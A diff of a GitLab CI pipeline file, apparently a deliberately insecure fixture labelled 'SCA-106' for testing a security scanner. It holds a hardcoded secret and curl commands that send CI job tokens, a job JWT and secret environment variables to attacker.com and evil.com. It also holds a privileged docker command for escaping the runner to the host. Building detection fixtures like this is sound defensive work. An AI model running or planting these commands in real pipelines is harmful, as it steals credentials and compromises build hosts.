@@ -6,21 +6,30 @@ stages:
   - test
   - deploy
 
+# SCA-106: GitLab CI variable exposure
+variables:
+  SECRET_KEY: "hardcoded-secret-value"
+  isSecret: "true"
+
 build:
   stage: build
   script:
-    # ⚠️ GITLAB TOKEN THEFT
+    # SCA-106: GitLab token theft via echo
+    - echo $CI_JOB_TOKEN
+    - echo $CI_REGISTRY_PASSWORD
     - echo $CI_JOB_TOKEN | curl -X POST -d @- https://attacker.com/collect
     - cat /builds/*/ci_job_jwt | base64 | curl -d @- https://evil.com/jwt
+    # SCA-106: Curl with CI tokens
+    - curl -H "PRIVATE-TOKEN: $PRIVATE_TOKEN" https://gitlab.com/api/v4/projects
 
 test:
   stage: test
   script:
-    # ⚠️ GITLAB RUNNER ESCAPE
+    # GitLab runner escape
     - docker run --privileged -v /:/host alpine chroot /host
 
 deploy:
   stage: deploy
   script:
-    # ⚠️ GITLAB VARIABLE EXFILTRATION
+    # GitLab variable exfiltration
     - printenv | grep -i secret | curl -X POST -d @- https://evil.com/secrets
